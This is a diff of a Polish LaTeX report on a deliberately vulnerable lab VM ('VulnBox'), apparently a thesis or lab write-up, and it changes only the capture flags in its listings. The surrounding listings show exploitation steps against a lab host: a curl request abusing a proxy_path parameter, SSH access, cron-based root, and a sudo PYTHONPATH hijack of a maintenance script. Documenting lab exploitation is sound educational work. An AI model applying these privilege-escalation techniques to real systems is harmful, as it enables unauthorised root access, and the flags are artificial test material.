@@ -80,7 +80,7 @@ $ curl -s -X POST "http://192.168.56.101:8080/?proxy_path=/api/v1/ssh-key&token=
 
 $ ssh -i ~/.ssh/id_ed25519 dev@192.168.56.101 "id && cat /home/dev/user.txt"
 uid=1001(dev) gid=1001(dev) groups=1001(dev)
-FLAG{vulnbox_user_stage_verified_272277_276711_272302}
+FLAG{Us3r_Sh3ll!7xK9#mP2@vQ4_d3v%8nR1}
 \end{lstlisting}
 
 Poprawne zalogowanie przez SSH na konto \texttt{dev} oraz odczyt zawartości pliku \texttt{/home/dev/user.txt} (listing \ref{lst:e2e-stage3}) potwierdzają ukończenie części użytkownika nieuprzywilejowanego.
@@ -112,7 +112,7 @@ EOF
 
 dev@vulnbox:~$ sleep 65 && cat /tmp/cron_verify.out
 uid=0(root) gid=0(root) groups=0(root)
-FLAG{vulnbox_root_stage_verified_272277_276711_272302}
+FLAG{R00t_Pwn3d!9zW6@kL3#bT8_sys%4mX2}
 \end{lstlisting}
 
 \Figure[0.88]{scr_04_root_cron.png}{Praktyczna weryfikacja ścieżki zadaniowej cron i potwierdzenie uprawnień root}{fig:scr-cron}
@@ -139,7 +139,7 @@ def collect_system_summary():
 EOF
 
 dev@vulnbox:~$ sudo PYTHONPATH=/tmp /usr/bin/python3 /opt/admin/maintenance.py
-[VulnBox Maintenance] System summary: {"euid": 0, "root_flag": "FLAG{vulnbox_root_stage_verified_272277_276711_272302}"}
+[VulnBox Maintenance] System summary: {"euid": 0, "root_flag": "FLAG{R00t_Pwn3d!9zW6@kL3#bT8_sys%4mX2}"}
 \end{lstlisting}
 
 \Figure[0.88]{scr_05_root_sudo.png}{Praktyczna weryfikacja ścieżki sudoers.d (PYTHONPATH) i odczyt flagi /root/root.txt}{fig:scr-sudo}
